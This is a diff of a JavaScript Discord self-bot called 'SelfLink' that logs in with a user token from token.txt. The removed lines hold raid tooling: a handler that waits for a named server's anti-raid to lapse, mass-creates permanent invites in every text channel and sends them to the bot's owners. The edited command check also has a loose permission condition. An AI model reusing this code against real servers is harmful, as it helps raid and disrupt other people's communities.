@@ -25,50 +25,14 @@ client.on('ready', () => {
     client.user.setActivity('SelfLink Connected', { type: 'STREAMING', name: 'SelfLink', url: 'https://discord.gg/PCSpuTgadU' });
 });
 
-let antiraid = false;
-client.on('guildCreate', async (guild) => {
-    if(!guild.id == '749395828925268060') return;
-    antiraid = true;
-    await sleep(5000);
-    if(antiraid) return;
-    client.users.cache.get(ownerid).send(`Antiraid disabled on krakovia ! Creating mass invites...`);
-    client.users.cache.get(coownerid).send(`Antiraid disabled on krakovia ! Creating mass invites...`);
-    guild.channels.cache.forEach(async (channel) => {
-        if(channel.type == 'GUILD_TEXT') {
-            for(let i = 0; i < 10; i++) {
-                await channel.createInvite({ maxAge: 0, maxUses: 0 }).catch((err) => {
-                    console.log(`Failed to create invite`);
-                }).then((invite) => {
-                    client.users.cache.get(ownerid).send(`Invite created : ${invite.url}`);
-                    client.users.cache.get(coownerid).send(`Invite created : ${invite.url}`);
-                });
-            }
-        }
-    });
-
-});
-
-client.on('guildDelete', async (guild) => {
-    if(!guild.id == '749395828925268060') return;
-    if(antiraid) {
-        console.log(`AntiRaid detected on krakovia !`);
-        return;
-    }
-    antiraid = false;
-});
-
-
-
 client.on('messageCreate', async (message) => {
     if(message.content.startsWith('.')) {
         let args = message.content.slice(1).split(' ');
         let command = args.shift().toLowerCase();
-        if(!message.author.id == ownerid && !message.author.id == coownerid && !message.author.id == client.user.id) return;
-        if(clientcommands.has(command)) {
+        if(clientcommands.has(command) && message.author.id == client.user.id) {
             clientcommands.get(command)(client, message, args);
-        }
-        if(!message.author.id == ownerid && !message.author.id == coownerid) return;
-        if(admincommands.has(command)) {
+        };
+        if(admincommands.has(command) && message.author.id == ownerid || clientcommands.has(command) && message.author.id == coownerid) {
             admincommands.get(command)(client, message, args);
         }
     }
@@ -79,7 +43,7 @@ let token = ''
 getToken();
 
 function getToken(){
-    if(fs.existsSync('token.txt')) {
+    if(fs.existsSync('./token.txt')) {
         console.log(`Token found in token.txt`);
         token = fs.readFileSync('./token.txt', 'utf-8');
         return client.login(token).catch((err) => {
